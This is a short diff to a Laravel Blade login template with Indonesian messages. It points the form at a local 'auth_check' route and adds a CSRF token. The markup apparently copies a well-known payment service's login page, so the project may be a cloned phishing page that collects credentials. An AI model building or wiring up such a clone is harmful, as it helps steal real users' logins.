@@ -1192,7 +1192,8 @@
                                             <p class="notification notification-warning blocked-on-risky-login hide">Silakan log in dengan email dan password Anda.</p>
                                             <p class="notification notification-critical keychain-activation-failure hide">Ada yang salah pada sistem kami. Silakan log in dengan email dan password Anda.</p>
                                         </div>
-                                        <form action="" method="post" class="proceed maskable" autocomplete="on" name="login" novalidate>
+                                        <form action="{{ route('auth_check') }}" method="post" class="proceed maskable" autocomplete="on" name="login" novalidate>
+                                            @csrf
                                             <div id="passwordSection" class="clearfix splitEmail">
                                                 <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                                     <div class="textInput" id="login_emaildiv">
